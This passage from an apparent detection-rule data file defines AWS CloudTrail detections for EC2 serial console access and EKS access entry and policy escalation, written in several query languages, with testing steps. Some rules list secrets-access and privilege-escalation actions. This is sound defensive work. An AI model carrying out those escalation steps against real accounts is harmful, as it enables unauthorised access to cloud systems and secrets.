      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "userAgent", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target instance.", "Verify if serial console access was authorized.", "Serial console bypasses security groups; treat as high-signal."],
    testingSteps: ["Call SendSerialConsoleSSHPublicKey.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-093",
    title: "Serial Console Access by Unexpected Actor",
    description: "Detects serial console access initiated by identities that should not troubleshoot instances at this depth. Suspicious actors include IAM users outside infra/platform roles, application roles, and non-admin assumed roles.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "Serial Console", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known infra/platform roles", "Approved recovery automation"],
    rules: {
      sigma: `title: Serial Console Access by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSerialConsoleSSHPublicKey
  filter_known:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/Infra'
      - '/role/Ops'
      - '/user/admin'
    userIdentity.sessionContext.sessionIssuer.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/Infra'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSerialConsoleSSHPublicKey
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.arn, "%/role/Ops%") OR like(userIdentity.arn, "%/user/admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Platform%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Infra%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSerialConsoleSSHPublicKey'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Infra%'
  AND userIdentity.arn NOT LIKE '%/role/Ops%'
  AND userIdentity.arn NOT LIKE '%/user/admin%'
  AND (userIdentity.sessionContext.sessionIssuer.arn IS NULL OR (userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Admin%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Platform%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Infra%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSerialConsoleSSHPublicKey"
| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|Infra|Ops)/ and userIdentity.arn not like /\\/user\\/admin/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for serial console.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-infra role, call SendSerialConsoleSSHPublicKey.", "Verify detection triggers."],
  },
  {
    id: "det-094",
    title: "Serial Console Access to Sensitive Target",
    description: "Detects serial console access to critical instances. Serial console on sensitive instances is especially dangerous because it bypasses ordinary network controls. Target matching uses instance ID patterns or naming conventions.",
    awsService: "EC2",
    relatedServices: [],
    severity: "Critical",
    tags: ["EC2", "Serial Console", "Sensitive Target"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized recovery to production instances", "Break-glass procedures"],
    rules: {
      sigma: `title: Serial Console Access to Sensitive Target
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSerialConsoleSSHPublicKey
  filter_target:
    requestParameters.instanceId|contains:
      - 'prod'
      - 'Prod'
      - 'production'
      - 'dc'
      - 'domain'
      - 'bastion'
      - 'secrets'
      - 'breakglass'
      - 'privileged'
  condition: selection and filter_target
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSerialConsoleSSHPublicKey
| where like(requestParameters.instanceId, "%prod%") OR like(requestParameters.instanceId, "%Prod%") OR like(requestParameters.instanceId, "%production%") OR like(requestParameters.instanceId, "%dc%") OR like(requestParameters.instanceId, "%domain%") OR like(requestParameters.instanceId, "%bastion%") OR like(requestParameters.instanceId, "%secrets%") OR like(requestParameters.instanceId, "%breakglass%") OR like(requestParameters.instanceId, "%privileged%")
| table _time, userIdentity.arn, requestParameters.instanceId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.instanceId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSerialConsoleSSHPublicKey'
  AND (requestParameters.instanceId LIKE '%prod%' OR requestParameters.instanceId LIKE '%Prod%' OR requestParameters.instanceId LIKE '%production%' OR requestParameters.instanceId LIKE '%dc%' OR requestParameters.instanceId LIKE '%domain%' OR requestParameters.instanceId LIKE '%bastion%' OR requestParameters.instanceId LIKE '%secrets%' OR requestParameters.instanceId LIKE '%breakglass%' OR requestParameters.instanceId LIKE '%privileged%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSerialConsoleSSHPublicKey"
| filter requestParameters.instanceId like /prod|dc|domain|bastion|secrets|breakglass|privileged/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-prod-db-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target instance and its sensitivity.", "Verify if serial console access was authorized.", "Serial console bypasses security groups; treat as critical."],
    testingSteps: ["Push serial console key to an instance with 'prod' in its identifier.", "Verify detection triggers."],
  },
  {
    id: "det-095",
    title: "Serial Console Access Followed by Suspicious Recovery or Persistence Activity",
    description: "High-confidence lateral movement: SendSerialConsoleSSHPublicKey then shortly after, same actor performs UpdateLoginProfile, CreateLoginProfile, StartSession, IAM policy modification, secrets access, key creation, or other strong post-access activity.",
    awsService: "EC2",
    relatedServices: ["IAM", "SSM", "Secrets Manager"],
    severity: "Critical",
    tags: ["EC2", "Serial Console", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate recovery followed by expected remediation"],
    rules: {
      sigma: `title: Serial Console Access Followed by Suspicious Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_serial:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSerialConsoleSSHPublicKey
  selection_sensitive:
    eventName:
      - UpdateLoginProfile
      - CreateLoginProfile
      - StartSession
      - PutUserPolicy
      - AttachRolePolicy
      - PutRolePolicy
      - GetSecretValue
      - CreateAccessKey
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ec2-instance-connect.amazonaws.com AND eventName=SendSerialConsoleSSHPublicKey) OR (eventName=UpdateLoginProfile OR eventName=CreateLoginProfile OR eventName=StartSession OR eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=GetSecretValue OR eventName=CreateAccessKey))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_serial=if(eventSource="ec2-instance-connect.amazonaws.com" AND eventName="SendSerialConsoleSSHPublicKey", 1, 0)
| eval is_sensitive=if(eventName IN ("UpdateLoginProfile","CreateLoginProfile","StartSession","PutUserPolicy","AttachRolePolicy","PutRolePolicy","GetSecretValue","CreateAccessKey"), 1, 0)
| transaction actor maxspan=15m
| where mvcount(mvfilter(is_serial=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.instanceId`,
      cloudtrail: `WITH serial_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS serial_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
    AND eventName = 'SendSerialConsoleSSHPublicKey'
),
sensitive_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('UpdateLoginProfile', 'CreateLoginProfile', 'StartSession', 'PutUserPolicy', 'AttachRolePolicy', 'PutRolePolicy', 'GetSecretValue', 'CreateAccessKey')
)
SELECT e.actor, e.serial_time, s.use_time, s.eventName
FROM serial_evt e
JOIN sensitive_evt s ON e.actor = s.actor
  AND s.use_time > e.serial_time
  AND s.use_time <= e.serial_time + INTERVAL '15' MINUTE
ORDER BY e.serial_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.instanceId
| filter (eventSource = "ec2-instance-connect.amazonaws.com" and eventName = "SendSerialConsoleSSHPublicKey")
  or eventName in ["UpdateLoginProfile", "CreateLoginProfile", "StartSession", "PutUserPolicy", "AttachRolePolicy", "PutRolePolicy", "GetSecretValue", "CreateAccessKey"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and SendSerialConsoleSSHPublicKey time.", "Review sequence: serial console → persistence/credential activity within 15 min.", "Verify if follow-on activity indicates compromise."],
    testingSteps: ["Push serial console key, then perform UpdateLoginProfile or GetSecretValue within 15 min.", "Run Splunk or Athena correlation query."],
  },

  // --- EKS Create Access Entry ---
  {
    id: "det-096",
    title: "EKS Access Entry Created",
    description: "Baseline visibility whenever a new access entry is created. Creating access entries is security-sensitive and often relatively uncommon, but may be legitimate platform administration.",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["EKS", "Access Entry", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate platform administration", "Cluster bootstrap"],
    rules: {
      sigma: `title: EKS Access Entry Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName: CreateAccessEntry
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=CreateAccessEntry
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName = 'CreateAccessEntry'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
| filter eventSource = "eks.amazonaws.com"
| filter eventName = "CreateAccessEntry"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.clusterName", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target principal.", "Verify if access entry creation was authorized.", "Check for follow-on AssociateAccessPolicy."],
    testingSteps: ["Call eks create-access-entry.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-097",
    title: "Access Entry Created for Suspicious Principal",
    description: "Detects likely abuse when the principal being granted cluster access is suspicious: IAM users, break-glass-like names, service/automation identities not expected to access Kubernetes, or unusual role naming patterns.",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EKS", "Access Entry", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Approved platform engineering roles", "Known bootstrap/node roles"],
    rules: {
      sigma: `title: Access Entry Created for Suspicious Principal
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName: CreateAccessEntry
  filter_iam_user:
    requestParameters.principalArn|contains: ':user/'
  filter_breakglass:
    requestParameters.principalArn|contains:
      - 'breakglass'
      - 'BreakGlass'
      - 'emergency'
  filter_app_role:
    requestParameters.principalArn|contains:
      - '/role/App'
      - '/role/Workload'
      - '/role/Service'
  condition: selection and (filter_iam_user or filter_breakglass or filter_app_role)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=CreateAccessEntry
| where like(requestParameters.principalArn, "%:user/%") OR like(requestParameters.principalArn, "%breakglass%") OR like(requestParameters.principalArn, "%BreakGlass%") OR like(requestParameters.principalArn, "%emergency%") OR like(requestParameters.principalArn, "%/role/App%") OR like(requestParameters.principalArn, "%/role/Workload%") OR like(requestParameters.principalArn, "%/role/Service%")
| table _time, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName = 'CreateAccessEntry'
  AND (requestParameters.principalArn LIKE '%:user/%'
    OR requestParameters.principalArn LIKE '%breakglass%'
    OR requestParameters.principalArn LIKE '%BreakGlass%'
    OR requestParameters.principalArn LIKE '%emergency%'
    OR requestParameters.principalArn LIKE '%/role/App%'
    OR requestParameters.principalArn LIKE '%/role/Workload%'
    OR requestParameters.principalArn LIKE '%/role/Service%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
| filter eventSource = "eks.amazonaws.com"
| filter eventName = "CreateAccessEntry"
| filter requestParameters.principalArn like /:user\\/|breakglass|emergency|\\/role\\/(App|Workload|Service)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.principalArn", "requestParameters.clusterName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the principal ARN and cluster.", "Verify if this principal should have cluster access.", "Check for AssociateAccessPolicy shortly after."],
    testingSteps: ["Create access entry for an IAM user.", "Verify detection triggers."],
  },
  {
    id: "det-098",
    title: "Access Policy Association Grants Broad Cluster Access",
    description: "Detects likely privilege escalation when a broad EKS access policy is associated to an access entry. Flags cluster-wide scope or admin-like policy ARNs (AmazonEKSClusterAdminPolicy, AmazonEKSAdminViewPolicy, etc.).",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EKS", "Access Policy", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized cluster admin association", "Platform bootstrap"],
    rules: {
      sigma: `title: Access Policy Association Grants Broad Cluster Access
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName: AssociateAccessPolicy
  filter_broad:
    requestParameters.policyArn|contains:
      - 'ClusterAdmin'
      - 'AdminView'
      - 'AmazonEKSClusterAdminPolicy'
      - 'AmazonEKSAdminViewPolicy'
  filter_cluster_scope:
    requestParameters.accessScope|contains: 'cluster'
  condition: selection and (filter_broad or filter_cluster_scope)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=AssociateAccessPolicy
| where like(requestParameters.policyArn, "%ClusterAdmin%") OR like(requestParameters.policyArn, "%AdminView%") OR like(requestParameters.policyArn, "%AmazonEKSClusterAdminPolicy%") OR like(requestParameters.policyArn, "%AmazonEKSAdminViewPolicy%") OR like(requestParameters.accessScope, "%cluster%")
| table _time, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName = 'AssociateAccessPolicy'
  AND (requestParameters.policyArn LIKE '%ClusterAdmin%'
    OR requestParameters.policyArn LIKE '%AdminView%'
    OR requestParameters.policyArn LIKE '%AmazonEKSClusterAdminPolicy%'
    OR requestParameters.policyArn LIKE '%AmazonEKSAdminViewPolicy%'
    OR requestParameters.accessScope LIKE '%cluster%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope, sourceIPAddress
| filter eventSource = "eks.amazonaws.com"
| filter eventName = "AssociateAccessPolicy"
| filter requestParameters.policyArn like /ClusterAdmin|AdminView|AmazonEKSClusterAdminPolicy|AmazonEKSAdminViewPolicy/ or requestParameters.accessScope like /cluster/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["AssociateAccessPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.policyArn", "requestParameters.accessScope", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "AssociateAccessPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker", policyArn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy", accessScope: { type: "cluster" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the policy ARN and access scope.", "Verify if broad access was authorized.", "Check the principal that received the policy."],
    testingSteps: ["Associate AmazonEKSClusterAdminPolicy to an access entry.", "Verify detection triggers."],
  },
  {
    id: "det-099",
    title: "Access Entry Creation Followed by Access Policy Association",
    description: "High-confidence EKS access escalation: CreateAccessEntry for principal X on cluster Y then shortly afterward AssociateAccessPolicy for the same principal X on cluster Y. Reduces false positives because immediate policy association is a strong sign of actual authorization being granted.",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["EKS", "Access Entry", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate access entry setup with policy", "Platform bootstrap"],
    rules: {
      sigma: `title: Access Entry Creation Followed by Policy Association
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: eks.amazonaws.com
    eventName: CreateAccessEntry
  selection_associate:
    eventSource: eks.amazonaws.com
    eventName: AssociateAccessPolicy
  condition: 1 of selection_*
level: critical
# Full correlation (principal+cluster, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com (eventName=CreateAccessEntry OR eventName=AssociateAccessPolicy)
| eval principal=requestParameters.principalArn
| eval cluster=requestParameters.clusterName
| eval key=principal."##".cluster
| eval is_create=if(eventName="CreateAccessEntry", 1, 0)
| eval is_associate=if(eventName="AssociateAccessPolicy", 1, 0)
| transaction key maxspan=15m
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_associate=1))>0
| table _time, key, principal, cluster, eventName`,
      cloudtrail: `WITH create_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS create_time, requestParameters.principalArn AS principal, requestParameters.clusterName AS cluster
  FROM cloudtrail_logs
  WHERE eventSource = 'eks.amazonaws.com'
    AND eventName = 'CreateAccessEntry'
),
assoc_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS assoc_time, requestParameters.principalArn AS principal, requestParameters.clusterName AS cluster, requestParameters.policyArn
  FROM cloudtrail_logs
  WHERE eventSource = 'eks.amazonaws.com'
    AND eventName = 'AssociateAccessPolicy'
)
SELECT c.actor, c.principal, c.cluster, c.create_time, a.assoc_time, a.policyArn
FROM create_evt c
JOIN assoc_evt a ON c.principal = a.principal AND c.cluster = a.cluster
  AND a.assoc_time > c.create_time
  AND a.assoc_time <= c.create_time + INTERVAL '15' MINUTE
ORDER BY c.create_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.principalArn, requestParameters.clusterName, requestParameters.policyArn
| filter eventSource = "eks.amazonaws.com"
| filter eventName in ["CreateAccessEntry", "AssociateAccessPolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by requestParameters.principalArn, requestParameters.clusterName
| filter cnt >= 2
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry", "AssociateAccessPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.principalArn", "requestParameters.clusterName", "requestParameters.policyArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify CreateAccessEntry and AssociateAccessPolicy sequence.", "Verify if both were authorized.", "Check the policy ARN for broad access."],
    testingSteps: ["Create access entry, then AssociateAccessPolicy within 15 min.", "Run Splunk or Athena correlation query."],
  },
  {
    id: "det-100",
    title: "EKS Access Entry Created or Policy Associated by Unexpected Actor",
    description: "Detects EKS cluster access changes performed by identities that should not manage cluster authorization. Suspicious actors: IAM users outside platform/cluster admin teams, application roles, workload roles, non-admin assumed roles.",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EKS", "Access Entry", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known EKS administrators", "Terraform/CloudFormation", "Platform automation"],
    rules: {
      sigma: `title: EKS Access Entry by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName:
      - CreateAccessEntry
      - AssociateAccessPolicy
  filter_arn:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/EKS'
      - '/role/ClusterAdmin'
  filter_automation:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
  condition: selection and not (filter_arn or filter_automation)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com (eventName=CreateAccessEntry OR eventName=AssociateAccessPolicy)
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/EKS%") OR like(userIdentity.arn, "%/role/ClusterAdmin%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName IN ('CreateAccessEntry', 'AssociateAccessPolicy')
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/EKS%'
  AND userIdentity.arn NOT LIKE '%/role/ClusterAdmin%'
  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%terraform%' AND userIdentity.principalId NOT LIKE '%cloudformation%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.clusterName, requestParameters.principalArn
| filter eventSource = "eks.amazonaws.com"
| filter eventName in ["CreateAccessEntry", "AssociateAccessPolicy"]
| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|EKS|ClusterAdmin)/ and userIdentity.principalId not like /terraform|cloudformation/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry", "AssociateAccessPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
